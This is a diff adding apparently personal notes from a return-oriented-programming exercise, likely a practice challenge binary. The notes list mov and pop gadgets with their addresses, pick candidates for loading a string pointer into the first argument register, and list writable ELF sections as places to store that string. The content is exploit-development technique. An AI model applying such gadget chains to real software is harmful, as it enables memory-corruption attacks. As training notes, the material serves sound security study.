@@ -1,0 +1,67 @@
+
+
+For this we will need to give the the exploit a string from input. To do this I think that operating on moving some thing from the stack pointer to edi is the way to go
+
+For example, I can know where (relitive to the esp) a string from the input will be. So if I can mov [esp -/+ Val], edi I can place a pointer to an arbitrary string into edi which is the first param.
+
+
+
+The rop gagets with mov are:
+
+```
+
+0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
+0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
+0x0000000000400629: mov dword ptr [rsi], edi; ret;
+0x0000000000400610: mov eax, 0; pop rbp; ret;
+0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
+0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
+0x0000000000400609: mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
+0x00000000004005db: mov ebp, esp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
+0x0000000000400619: mov ebp, esp; mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret;
+0x000000000040061b: mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret;
+0x000000000040057c: mov edi, 0x601038; jmp rax;
+0x0000000000400628: mov qword ptr [r14], r15; ret;
+0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
+0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
+0x0000000000400608: mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret;
+0x00000000004005da: mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
+0x0000000000400618: mov rbp, rsp; mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret;
+
+0x00007ffff7fe2723: mov edi, dword ptr [rbp - 0x464]; lea rsi, [rbp - 0x430]; mov eax, 0x14; syscall;
+0x00007ffff7fedf4d: mov edi, dword ptr [rdi + 0x28]; mov eax, esi; mov rsp, r8; mov rbp, r9; jmp rdx;
+0x00007ffff7fe96c1: mov edi, dword ptr [rip + 0x14a41]; lea rax, [rdi - 1]; cmp rax, -3; jbe 0x7ffff806ab78; ret;
+0x00007ffff7dc8878: mov edi, dword ptr [rip + 0x2007e2]; call 0x7ffff7e49c60; call 0x7ffff7e49c70; mov byte ptr [rip + 0x2007d9], 1; pop rbp; ret;
+0x00007ffff7fecac0: mov edi, dword ptr [rsp + 0x18]; call rcx;
+0x00007ffff7fe1ed5: mov edi, dword ptr [rsp + 0x28]; mov qword ptr [rsp + 0x18], r9; mov qword ptr [rsp + 0x10], r8; call rax;
+
+
+# This looks the most useful for working with
+0x00007ffff7fea3a4: mov edi, dword ptr [rsp - 8]; ret;
+
+
+0x00007ffff7fea324: mov edi, dword ptr [rsp]; call rax;
+
+# Note: this one may be useful with a strait up syscall
+0x00007ffff7fd09c4: mov edi, ebx; mov rsi, r12; pop rbx; mov eax, 0xe4; syscall;
+
+
+Pop rdi
+0x0000000000400693: pop rdi; ret;
+
+```
+
+
+
+Looking at the perms on parts of the code we see the following areas are able to be written to
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
+19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
+20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
+21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
+22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
+
+My guess is that the .dynamic area is probably the best option or possibly the .data section
